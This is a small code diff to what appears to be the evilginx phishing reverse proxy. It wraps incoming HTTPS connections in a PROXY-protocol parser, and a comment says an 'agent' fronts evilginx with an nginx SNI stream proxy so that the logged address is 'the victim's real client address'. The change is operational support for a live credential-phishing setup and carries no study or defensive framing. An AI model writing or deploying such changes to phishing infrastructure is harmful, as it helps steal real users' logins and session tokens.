@@ -1653,6 +1653,11 @@ func (p *HttpProxy) httpsWorker() {
 		}
 
 		go func(c net.Conn) {
+			// The agent fronts evilginx through an nginx TCP SNI stream proxy
+			// with PROXY protocol enabled. Consume the leading PROXY header so
+			// the victim's real client address is used instead of 127.0.0.x.
+			c = wrapProxyProto(c)
+
 			now := time.Now()
 			c.SetReadDeadline(now.Add(httpReadTimeout))
 			c.SetWriteDeadline(now.Add(httpWriteTimeout))
